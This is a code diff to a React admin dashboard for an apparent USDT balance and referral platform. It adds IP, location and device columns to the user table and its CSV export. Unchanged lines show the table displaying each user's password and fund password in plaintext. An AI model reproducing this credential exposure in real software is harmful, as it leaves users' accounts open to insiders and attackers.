@@ -258,9 +258,9 @@ export default function AdminDashboard() {
                                     (u.username || '').toLowerCase().includes(q) ||
                                     (u.email || '').toLowerCase().includes(q)
                                 );
-                                const headers = ["UID", "Username", "Email", "Invite Code", "Referred By", "USDT Balance", "Status"];
+                                const headers = ["UID", "Username", "Email", "IP", "Location", "Device", "Invite Code", "Referred By", "USDT Balance", "Status"];
                                 const csvData = filtered.map(u => [
-                                    u.uid, u.username || '', u.email, u.myInviteCode || '', u.referredBy || '', u.balances?.usdt || 0, u.isBlocked ? 'Blocked' : 'Active'
+                                    u.uid, u.username || '', u.email, u.ipAddress || 'Unknown', `"${u.location || 'Unknown'}"`, `"${u.device || 'Unknown'}"`, u.myInviteCode || '', u.referredBy || '', u.balances?.usdt || 0, u.isBlocked ? 'Blocked' : 'Active'
                                 ].join(","));
                                 const csvContent = [headers.join(","), ...csvData].join("\n");
                                 const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
@@ -295,6 +295,9 @@ export default function AdminDashboard() {
                                         <th style={{ padding: '12px 8px' }}>Email</th>
                                         <th style={{ padding: '12px 8px' }}>Password</th>
                                         <th style={{ padding: '12px 8px' }}>Fund Password</th>
+                                        <th style={{ padding: '12px 8px' }}>IP Address</th>
+                                        <th style={{ padding: '12px 8px' }}>Location</th>
+                                        <th style={{ padding: '12px 8px' }}>Device</th>
                                         <th style={{ padding: '12px 8px' }}>My Invite Code</th>
                                         <th style={{ padding: '12px 8px' }}>Referred By (UID)</th>
                                         <th style={{ padding: '12px 8px' }}>Balances</th>
@@ -319,6 +322,9 @@ export default function AdminDashboard() {
                                             <td style={{ padding: '12px 8px' }}>{u.email}</td>
                                             <td style={{ padding: '12px 8px' }}>{u.password || 'N/A'}</td>
                                             <td style={{ padding: '12px 8px', color: '#f59e0b' }}>{u.fundPassword || 'N/A'}</td>
+                                            <td style={{ padding: '12px 8px' }}>{u.ipAddress || 'Unknown'}</td>
+                                            <td style={{ padding: '12px 8px', fontSize: '11px', color: '#64748b' }}>{u.location || 'Unknown'}</td>
+                                            <td style={{ padding: '12px 8px', fontSize: '11px', color: '#1677FF', fontWeight: 'bold' }}>{u.device || 'Unknown'}</td>
                                             <td style={{ padding: '12px 8px', color: '#10b981', fontWeight: 'bold' }}>{u.myInviteCode || 'N/A'}</td>
                                             <td style={{ padding: '12px 8px', color: '#7c3aed', fontSize: '12px' }}>{u.referredBy || '—'}</td>
                                             <td style={{ padding: '12px 8px' }}>
